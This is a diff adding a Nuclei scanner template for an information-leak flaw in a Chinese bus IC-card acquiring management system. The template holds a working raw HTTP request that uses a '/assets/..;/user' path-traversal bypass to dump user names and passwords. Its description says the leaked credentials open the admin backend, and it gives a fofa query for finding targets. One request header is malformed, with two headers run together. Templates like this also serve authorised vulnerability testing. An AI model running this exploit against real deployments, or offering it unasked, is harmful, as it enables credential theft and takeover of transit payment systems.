@@ -1,0 +1,42 @@
+id: gongjiao-ic-user-info-leak
+
+info:
+  name: 公交IC卡收单管理系统 user - Info Leak
+  author: qwtd
+  severity: high
+  description: |
+    公交IC卡收单管理系统信息泄露漏洞，通过泄露的账户密码 登录后台系统。
+    fofa: app="公交IC卡收单管理系统"
+  reference:
+    - https://wiki.wy876.cn/#/./%E5%85%AC%E4%BA%A4IC%E5%8D%A1%E6%94%B6%E5%8D%95%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E5%85%AC%E4%BA%A4IC%E5%8D%A1%E6%94%B6%E5%8D%95%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E
+  tags: 公交IC卡收单管理系统
+
+http:
+  - raw:
+      - |
+        POST /assets/..;/user HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=B4B300824AA8F075EAC1E702454B91B
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 197
+
+        _search=false&nd=1727275150716&rowCountPerPage=10&pageNo=1&sidx=USER_NAME&sord=asc&method=select&USER_NAME=&REAL_NAME=&ACCOUNT_EXPIRE_TIME=%E5%BF%BD%E7%95%A5&PASSWORD_EXPIRE_TIME=%E5%BF%BD%E7%95%A5
+      
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "USER_PASSWORD"
+          - "USER_NAME"
+          - "rowNo"
+        condition: and
+
+      - type: status
+        status:
+          - 200
